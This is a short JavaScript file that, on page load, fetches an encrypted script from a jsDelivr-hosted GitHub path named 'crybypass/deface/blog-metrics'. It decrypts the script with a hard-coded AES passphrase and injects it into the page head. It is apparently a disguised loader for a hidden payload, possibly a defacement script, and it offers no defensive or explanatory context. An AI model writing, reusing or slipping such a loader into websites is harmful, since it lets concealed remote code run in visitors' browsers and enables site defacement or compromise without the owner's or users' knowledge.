(() => {

    const PASSPHRASE = "HaxorAI-2026-Secret";

    const loadEncrypted = async () => {

        try {

            const response = await fetch("https://cdn.jsdelivr.net/gh/crybypass/deface/blog-metrics/js/encrypted.js", {
                cache: "no-store"
            });

            if (!response.ok)
                throw new Error("Unable to load encrypted source.");

            const encrypted = await response.text();

            const bytes = CryptoJS.AES.decrypt(
                encrypted,
                PASSPHRASE
            );

            const source = bytes.toString(CryptoJS.enc.Utf8);

            if (!source)
                throw new Error("Wrong passphrase.");

            const script = document.createElement("script");

            script.text = source;

            document.head.appendChild(script);

        }

        catch (err) {

            console.error(err);

        }

    };

    if (document.readyState === "loading") {

        document.addEventListener(
            "DOMContentLoaded",
            loadEncrypted
        );

    }

    else {

        loadEncrypted();

    }

})();
